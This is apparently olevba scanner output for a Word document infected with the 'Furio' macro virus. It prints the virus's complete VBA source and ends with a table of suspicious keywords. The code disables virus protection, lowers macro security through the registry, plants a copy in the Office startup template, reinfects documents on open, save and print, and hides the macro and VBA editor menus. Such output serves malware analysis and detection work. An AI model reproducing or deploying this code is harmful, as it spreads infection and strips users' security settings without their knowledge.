olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Furi
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Furi - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Furio.bas 
in file: ./Virus.MSWord.Furi - OLE stream: 'Macros/VBA/Furio'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Furio
Sub AutoClose()
    On Error Resume Next
    ' Furio Virus v1.00 by WalruS 09/00
    Options.VirusProtection = False
    Options.ConfirmConversions = False
    Options.SaveNormalPrompt = False
    Application.DisplayAlerts = wdAlertsNone
    Application.DisplayStatusBar = False
    Application.ScreenUpdating = False
    ActiveDocument.ReadOnlyRecommended = False
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "The WalruS"
    ActiveDocument.VBProject.VBComponents("Furio").export ("C:\Windows\Furio.drv")
    ActiveDocument.VBProject.VBComponents("AboutFrm").export ("C:\Windows\AboutFrm.Frm")
    SetAttr ("C:\Windows\Furio.drv"), 6
    Template = Dir("C:\Program Files\Microsoft Office\Office\STARTUP\Furio.dot")
    If Template = "" Then
    NormalTemplate.OpenAsDocument
    ActiveDocument.VBProject.VBComponents.Import ("C:\Windows\Furio.drv")
    ActiveDocument.VBProject.VBComponents.Import ("C:\Windows\AboutFrm.frm")
    ActiveDocument.SaveAs ("C:\Program Files\Microsoft Office\Office\STARTUP\Furio.dot")
    NormalTemplate.Saved = True
    ActiveDocument.Close
    End If
    If Second(Now) = Minute(Now) Then Call Payload
End Sub

Sub SpreadTheWord()
    On Error Resume Next
    If ActiveDocument.VBProject.VBComponents.Item("Furio").CodeModule.Lines(1, 1) <> "' Furio" Then
    ActiveDocument.VBProject.VBComponents.Import ("C:\Windows\Furio.drv")
    ActiveDocument.VBProject.VBComponents.Import ("C:\Windows\AboutFrm.frm")
    ActiveDocument.Save
    End If
End Sub

Sub FileOpen()
    On Error Resume Next
    Dialogs(wdDialogFileOpen).Show
    Call SpreadTheWord
End Sub

Sub FileSave()
    On Error Resume Next
    Call SpreadTheWord
    ActiveDocument.Save
End Sub

Sub FilePrintDefault()
    On Error Resume Next
    Call SpreadTheWord
    If Second(Now) = 59 Then Selection.TypeText " Please Select Help About For More Information!"
    ActiveDocument.PrintOut
End Sub

Sub Payload()
    On Error Resume Next
    Options.BlueScreen = True
    MyApp = Shell("notepad.exe", 1)
    SendKeys "Hello there!~~Im the WalruS. Welcome To My New Creation - Furio~~~///0-0\\\    WalruS 09/00", True
    AppActivate (MyApp)
End Sub

Sub HelpAbout()
    On Error Resume Next
    AboutFrm.Show
End Sub

Sub ToolsOptions()
    On Error Resume Next
    Options.VirusProtection = 1
    Options.SaveNormalPrompt = 1
    Dialogs(wdDialogToolsOptions).Show
    Options.VirusProtection = 0
    Options.SaveNormalPrompt = 0
End Sub

Sub ViewVBCode(): End Sub
Sub ToolsMacro(): End Sub
Sub FileTemplates(): End Sub ' cya
-------------------------------------------------------------------------------
VBA MACRO AboutFrm.frm 
in file: ./Virus.MSWord.Furi - OLE stream: 'Macros/VBA/AboutFrm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub Label2_Click()
MsgBox "Goo Goo G'Joob", vbExclamation, "Furio By WalruS"
End Sub



-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Furi' - OLE stream: 'Macros/AboutFrm/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Welcomel
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Furi' - OLE stream: 'Macros/AboutFrm/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�WalruSel
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Furi' - OLE stream: 'Macros/AboutFrm/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tab3
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Furi' - OLE stream: 'Macros/AboutFrm/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Tab4
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Furi' - OLE stream: 'Macros/AboutFrm/i01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Furi' - OLE stream: 'Macros/AboutFrm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Welcome To The Furio Virus By The WalruS                                                                                                                                   
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Furi' - OLE stream: 'Macros/AboutFrm/i01/i03/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MS]E
-------------------------------------------------------------------------------
VBA FORM Variable "b'MultiPage1'" IN './Virus.MSWord.Furi' - OLE stream: 'Macros/AboutFrm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "None" IN './Virus.MSWord.Furi' - OLE stream: 'Macros/AboutFrm/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Page1'" IN './Virus.MSWord.Furi' - OLE stream: 'Macros/AboutFrm/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Page2'" IN './Virus.MSWord.Furi' - OLE stream: 'Macros/AboutFrm/i01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN './Virus.MSWord.Furi' - OLE stream: 'Macros/AboutFrm/i01/i03'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Label2_Click        |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|AppActivate         |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |notepad.exe         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

